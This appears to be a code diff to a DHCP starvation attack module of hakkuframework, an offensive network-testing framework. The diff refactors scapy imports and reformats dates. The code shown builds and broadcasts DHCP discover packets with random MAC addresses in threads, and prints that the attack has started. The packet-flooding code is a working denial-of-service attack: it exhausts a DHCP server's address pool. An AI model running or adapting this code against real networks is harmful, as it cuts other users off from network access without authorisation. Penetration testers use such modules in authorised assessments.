@@ -3,7 +3,7 @@
 from core.hakkuframework import *
 from core import colors
 import threading, queue
-from scapy.all import *
+import scapy.all as scapy
 from scapy.all import conf as confs
 import random
 
@@ -14,8 +14,8 @@ conf = {
     "github": "4shadoww", # Author's github
     "author": "4shadoww", # Author
     "email": "4shadoww0@gmail.com", # Email
-    "initdate": "01.01.2017", # Initial date
-    "lastmod": "01.01.2017", # Last modification
+    "initdate": "2017-01-01", # Initial date
+    "lastmod": "2017-01-01", # Last modification
     "apisupport": False, # Api support
     "needroot": 1, # Alert user if root permissions not available (remove variable below if root permissions not needed)
 }
@@ -41,13 +41,13 @@ class DhcpRequest(threading.Thread):
         baseip = ".".join(self.router.split('.')[0:-1]) + '.'
         targetip = baseip+self.last
         confs.checkIPaddr = False
-        hw = get_if_raw_hwaddr(confs.iface)
-        dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/\
-        IP(src="0.0.0.0",dst="255.255.255.255")/\
-        UDP(sport=68,dport=67)/\
-        BOOTP(chaddr=RandString(RandNum(1,50)))/\
-        DHCP(options=[("message-type","discover"),"end"])
-        sendp(dhcp_discover, verbose=0)
+        hw = scapy.get_if_raw_hwaddr(confs.iface)
+        dhcp_discover = scapy.Ether(src=scapy.RandMAC(),dst="ff:ff:ff:ff:ff:ff")/\
+        scapy.IP(src="0.0.0.0",dst="255.255.255.255")/\
+        scapy.UDP(sport=68,dport=67)/\
+        scapy.BOOTP(chaddr=scapy.RandString(scapy.RandNum(1,50)))/\
+        scapy.DHCP(options=[("message-type","discover"),"end"])
+        scapy.sendp(dhcp_discover, verbose=0)
 
 def run():
     print_info("attack has been started...")
